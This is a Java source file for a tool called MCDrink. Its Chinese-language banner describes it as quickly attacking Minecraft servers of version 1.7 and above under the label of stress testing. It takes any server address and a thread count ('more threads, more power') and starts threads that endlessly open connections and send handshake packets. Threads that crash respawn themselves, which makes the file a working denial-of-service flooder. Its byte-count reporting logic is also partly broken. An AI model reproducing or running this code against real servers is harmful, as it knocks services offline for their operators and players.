import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

public class main {
	public static long data=0;
	public static String[] part1;
	public static int port;
	public static void main(String[] args) {
		// TODO 自动生成的方法存根
		System.out.println("欢迎使用MCDrink,作者:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
		System.out.println("本软件利用mc的协议,快速攻击mc1.7及以上的版本的服务器(因为1.7以下版本的服务器协议可能不一样),达到压测的目的");
		Scanner s=new Scanner(System.in);
		System.out.print("请输入服务器完整地址(如127.0.0.1:25565):");
		String ip=s.nextLine();
		System.out.print("请输入线程数量(建议10,线程越多威力越大,线程过多会死机):");
		String threadNum=s.nextLine();
		main.part1=ip.split(":");
		main.port=Integer.parseInt(part1[1]);
		int num=Integer.parseInt(threadNum);
		System.out.println("准备完毕,正在启动线程,长时间显示\"[AnotherThread]>0byte\"信息则为攻击失败");
		Runnable thread4 = new Thread4(); 
		Thread thread3 = new Thread(thread4);
		thread3.start();//启动解析线程
		for(int i=1;i<=num;i++) {
			Runnable thread1 = new Thread1(); 
			Thread thread2 = new Thread(thread1);
			thread2.start();//启动解析线程
		}
		
	}
	public static int readVarInt(DataInputStream in) throws IOException {
		int i = 0;
		int j = 0;
		while (true) {
			int k = in.readByte();
			i |= (k & 0x7F) << j++ * 7;
			if (j > 5) throw new RuntimeException("VarInt too big");
			if ((k & 0x80) != 128) break;
		}
		return i;
	}
	public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
		while (true) {
			if ((paramInt & 0xFFFFFF80) == 0) {
				out.writeByte(paramInt);
				return;
			}
			out.writeByte(paramInt & 0x7F | 0x80);
			paramInt >>>= 7;
		}
	}
}
class Thread1 implements Runnable {
	@Override
	public void run() {
		try {
			while(true) {
				Socket s=new Socket(main.part1[0],main.port);
				
				InputStream is=s.getInputStream();
				DataInputStream di=new DataInputStream(is);
				OutputStream os=s.getOutputStream();
				DataOutputStream dos=new DataOutputStream(os);
				//握手包数据流
				ByteArrayOutputStream b = new ByteArrayOutputStream();
				DataOutputStream handshake = new DataOutputStream(b);
				
				handshake.write(0x00);//先握手
				main.writeVarInt(handshake,-1);//版本号未知
				main.writeVarInt(handshake,main.part1[0].length()); //ip地址长度
				handshake.writeBytes(main.part1[0]); //ip
				handshake.writeShort(main.port); //port
				main.writeVarInt(handshake, 2); //state (1 for handshake)
				
				main.writeVarInt(dos, b.size()); //prepend size
				dos.write(b.toByteArray()); //write handshake packet
				
				dos.flush();
				
				//System.out.println("[DrinkThread]>handshake OK");
				//System.out.println(di.readByte());
				main.data=main.data+main.readVarInt(di);//读包大小,没了
				//System.out.println("[DrinkThread]>"+main.data+"byte");
				di.close();
				is.close();
				dos.close();
				os.close();
				s.close();
			}
		} catch (Exception e) {
			// TODO 自动生成的 catch 块
			Runnable thread1 = new Thread1(); 
			Thread thread2 = new Thread(thread1);
			thread2.start();//重生!
			System.out.println("[WARNING]线程自爆,正在复活....");
		}
	}
}

class Thread4 implements Runnable {
	@Override
	public void run() {
		try {
			while(true) {
				Thread.sleep(3000);
				if(main.data<1024) {
					System.out.println("[AnotherThread]>"+main.data+"byte");
					continue;
				}
				if(main.data>=1024) {
					double a=main.data/1024;
					System.out.println("[AnotherThread]>"+a+"kb");
					continue;
				}
				if(main.data>=1024*1024) {
					double a=main.data/(1024*1024);
					System.out.println("[AnotherThread]>"+a+"mb");
					continue;
				}
				if(main.data>=1024*1024*1024) {
					double a=main.data/(1024*1024*1024);
					System.out.println("[AnotherThread]>"+a+"kb");
					continue;
				}
				
			}
		} catch (InterruptedException e) {
			// TODO 自动生成的 catch 块
			e.printStackTrace();
		}
		
	}
}